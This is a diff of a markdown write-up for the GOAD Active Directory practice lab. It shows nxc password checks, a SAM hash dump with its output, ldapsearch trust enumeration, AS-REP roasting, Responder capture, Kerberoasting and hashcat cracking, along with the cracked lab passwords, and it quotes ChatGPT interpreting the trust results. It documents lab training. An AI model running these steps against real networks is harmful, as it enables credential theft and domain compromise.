@@ -1,7 +1,6 @@
 
 ## User Enumeration
 
-
 ### Samwell Tarly
 
 Samuel's Tarly's credentials were first to be discovered.  Initially rpcclient was used to enumerate users.
@@ -94,6 +93,9 @@ It is important to enumerate the password policy should a password spray be requ
 
 nxc smb 192.168.56.0/24 -u samwell.tarly -p Heartsbane --pass-pol
 
+
+<hr>
+
 ### Arya Stark
 
 Using credentials discovered from null session enumeration that revealed sensitive information disclosure where credentials were left in the open.
@@ -172,6 +174,10 @@ nxc smb 192.168.56.0/24 -u 'arya.stark' -p 'Needle'
 
 
 <div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/08-arya-password-confirmation.png'><br><ins>Password Confirmed</ins></div>
+
+
+<hr>
+
 ### Jeor Mormont
 
 What can this Arya account access ? We run nxc once more ...
@@ -191,7 +197,7 @@ $taskName = "fake task"
 $user = "NORTH\jeor.mormont"
 $password = "_L0ngCl@w_"
 ```
-### Brandon Stark
+
 
 Having found Jeor Mormont's creds, ence again the credentials are tested over again ...
 
@@ -207,7 +213,7 @@ It is discovered that Jeor Mormont has Administrator access on `CASTLEBLACK`, ob
 nxc smb 192.168.56.22 -u 'jeor.mormont' -p '_L0ngCl@w_' --sam
 ```
 
-```r
+```bash
 SMB         192.168.56.22   445    CASTELBLACK      [*] Dumping SAM hashes
 SMB         192.168.56.22   445    CASTELBLACK      Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
 SMB         192.168.56.22   445    CASTELBLACK      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -215,7 +221,6 @@ SMB         192.168.56.22   445    CASTELBLACK      DefaultAccount:503:aad3b435b
 SMB         192.168.56.22   445    CASTELBLACK      WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4363b6dc0c95588964884d7e1dfea1f7:::
 SMB         192.168.56.22   445    CASTELBLACK      vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
 ```
-
 
 ```
 nxc smb 192.168.56.22 -u 'jeor.mormont' -p '_L0ngCl@w_' --loggedon-users
@@ -233,6 +238,8 @@ SMB         192.168.56.22   445    CASTELBLACK      NORTH\robb.stark          lo
 
 ```
 
+<hr>
+### Brandon Stark
 
 ##### AS-REPRoasting
 
@@ -275,6 +282,48 @@ extracting the 5th column
 ```bash
 awk '{print $5}' users.txt | sort | uniq | tee users2.tx
 ```
+
+It is possible to list these users because of trust relationships that exists. The trust relationship can be enumerated by the following `ldapsearch` command
+
+```ruby
+ldapsearch -LLL -H ldap://192.168.56.10 -D "jeor.mormont@north.sevenkingdoms.local" -w '_L0ngCl@w_' -b 'DC=sevenkingdoms,DC=local'  '(objectClass=trustedDomain)' cn trustPartner trustDirection trustType trustAttributes flatName
+```
+
+The results are as follows :
+
+```ruby
+dn: CN=north.sevenkingdoms.local,CN=System,DC=sevenkingdoms,DC=local
+cn: north.sevenkingdoms.local
+trustDirection: 3
+trustPartner: north.sevenkingdoms.local
+trustType: 2
+trustAttributes: 32
+flatName: NORTH
+
+dn: CN=essos.local,CN=System,DC=sevenkingdoms,DC=local
+cn: essos.local
+trustDirection: 3
+trustPartner: essos.local
+trustType: 2
+trustAttributes: 72
+flatName: ESSOS
+
+# refldap://north.sevenkingdoms.local/DC=north,DC=sevenkingdoms,DC=local
+
+# refldap://ForestDnsZones.sevenkingdoms.local/DC=ForestDnsZones,DC=sevenkingdo
+ ms,DC=local
+
+# refldap://DomainDnsZones.sevenkingdoms.local/DC=DomainDnsZones,DC=sevenkingdo
+ ms,DC=local
+
+# refldap://sevenkingdoms.local/CN=Configuration,DC=sevenkingdoms,DC=local
+```
+
+ChatGPT says :
+
+> [!NOTE] Conclusion
+> The provided search result gives details about two domain trusts in the `sevenkingdoms.local` domain. Both trusts are bidirectional and external, with `north.sevenkingdoms.local` and `essos.local` as the trusted partners. The `trustAttributes` values provide additional specifics about the nature of these trusts, though exact meanings may require referencing the specific AD schema or documentation for precise attribute definitions.
+
 
 The impacket command can now be run, we need to cycle through each dc-ip and domain pair
 
@@ -319,7 +368,7 @@ $krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:240f046c623f1713579bd96fb4
 The creds are `brandon.stark : iseedeadpeople`
 
 
-
+<hr>
 ### Robb Stark
 
 Responder was run
@@ -341,3 +390,29 @@ hashcat.exe -a 0 -m 5600 hashes\robb.stark.hash wordlist\rockyou.txt
 ```
 
 <div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/14-Robb-Stark-cracked.png'><br><ins>Robb's hash cracked</ins></div>
+
+Robbs creds are
+
+```
+robb.stark : sexywolf
+```
+
+
+<hr>
+### Jon Snow
+
+The account is Kerberoastable using credentials for `samwell.tarly`, `arya.stark`, `jeor.mormont`, `brandon.stark` but not `robb.stark`. The has was cracked using hashcat and rockyou.txt. So many accounts being able to dump shares probably relates to unconstrained delegation of a group
+
+```bash
+nxc ldap 192.168.56.11 -u arya.stark -p 'Needle' --kerberoasting 11_kerberoastable.txt
+```
+
+
+```bash
+hashcat.exe -m 13100 .\hashes\11_kerberoastable.txt .\wordlist\rockyou.txt --keep-guessing
+```
+
+The creds are 
+```
+jon.snow : iknownothing
+```
